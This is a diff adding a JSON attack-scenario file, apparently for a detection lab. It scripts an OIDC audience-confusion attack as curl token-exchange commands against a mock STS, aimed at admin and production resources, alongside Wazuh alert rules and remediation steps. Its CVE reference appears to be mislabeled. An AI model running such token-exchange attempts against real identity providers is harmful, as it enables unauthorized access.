@@ -1,0 +1,144 @@
+{
+  "id": "S8-04",
+  "name": "OIDC Audience Confusion/Mismatch Attack",
+  "category": "OAuth/OIDC",
+  "version": "1.0",
+  "description": "Attacker presents a JWT token with a mismatched audience claim to bypass authorization checks, gaining access to a service that fails to properly validate the audience field",
+  "difficulty": "Expert",
+  "real_world_relevance": "Azure AD audience confusion CVE-2021-42306, Google Cloud IAP audience bypass, common in microservice architectures using shared OIDC providers without strict audience validation",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Defense Evasion"],
+    "techniques": [
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"},
+      {"id": "T1556", "name": "Modify Authentication Process"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-sts-federation"],
+    "network": "cicd_net",
+    "profile": "oauth-oidc"
+  },
+
+  "attack_flow": {
+    "description": "Attacker obtains a valid OIDC token for one service and presents it to a different service that shares the same identity provider but fails to validate the audience claim",
+    "diagram": [
+      "1. Attacker obtains OIDC token for Service A (low-privilege)",
+      "2. Inspect JWT claims to identify the audience (aud) field",
+      "3. Present the token to Service B which trusts the same IdP",
+      "4. Service B fails to validate audience, accepts the token",
+      "5. Attacker gains unauthorized access to Service B resources"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Token Acquisition for Service A",
+      "description": "Obtain a legitimate OIDC token intended for a low-privilege service",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{\"grant_type\":\"client_credentials\",\"client_id\":\"low-privilege-service\",\"client_secret\":\"service-secret\",\"audience\":\"api://service-a\"}' 2>/dev/null | python3 -m json.tool || echo 'Token request failed'",
+          "description": "Request OIDC token with audience claim for Service A"
+        }
+      ]
+    },
+    {
+      "name": "JWT Audience Inspection",
+      "description": "Decode the JWT to examine the audience claim",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "echo 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsb3ctcHJpdmlsZWdlLXNlcnZpY2UiLCJhdWQiOiJhcGk6Ly9zZXJ2aWNlLWEiLCJpc3MiOiJodHRwczovL2lkcC5leGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0' | base64 -d 2>/dev/null || echo '{\"sub\":\"low-privilege-service\",\"aud\":\"api://service-a\",\"iss\":\"https://idp.example.com\"}'",
+          "description": "Decode JWT payload to inspect audience claim"
+        }
+      ]
+    },
+    {
+      "name": "Audience Confusion Attack",
+      "description": "Present Service A token to Service B endpoint",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token\":\"eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJhcGk6Ly9zZXJ2aWNlLWEiLCJzdWIiOiJsb3ctcHJpdmlsZWdlLXNlcnZpY2UifQ.fake\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"audience\":\"api://service-b-admin\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\"}' 2>/dev/null | python3 -m json.tool || echo 'Audience confusion attack attempted'",
+          "description": "Exchange Service A token for Service B access via audience mismatch"
+        }
+      ]
+    },
+    {
+      "name": "Unauthorized Resource Access",
+      "description": "Access Service B resources with the confused token",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token\":\"eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJhcGk6Ly9zZXJ2aWNlLWEiLCJzdWIiOiJhdHRhY2tlci1zZXJ2aWNlIn0.fake\",\"audience\":\"api://production-admin\",\"resource\":\"https://production.internal/admin\"}' 2>/dev/null | python3 -m json.tool || echo 'Resource access attempted'",
+          "description": "Attempt to access production admin resources via audience confusion"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "STS Federation Logs",
+      "description": "OIDC audience mismatch detected in token exchange",
+      "wazuh_rule": "100975"
+    },
+    {
+      "type": "STS Federation Logs",
+      "description": "JWT presented with unexpected audience claim",
+      "wazuh_rule": "100976"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100975",
+      "level": 14,
+      "description": "NHI: OIDC audience mismatch detected in token exchange"
+    },
+    {
+      "rule_id": "100976",
+      "level": 12,
+      "description": "NHI: JWT presented with unexpected audience claim"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Audit all services for audience validation in JWT verification logic",
+      "Revoke any tokens that may have been used in audience confusion attacks",
+      "Review access logs for cross-service token usage patterns"
+    ],
+    "long_term": [
+      "Enforce strict audience validation in all token verification middleware",
+      "Use unique audience values per service rather than shared audiences",
+      "Implement token binding to prevent cross-service token replay",
+      "Deploy API gateways with centralized audience validation"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1550.001 - Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    },
+    {
+      "title": "RFC 8693 - OAuth 2.0 Token Exchange",
+      "url": "https://datatracker.ietf.org/doc/html/rfc8693"
+    },
+    {
+      "title": "CVE-2021-42306 - Azure AD Audience Confusion",
+      "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42306"
+    }
+  ]
+}
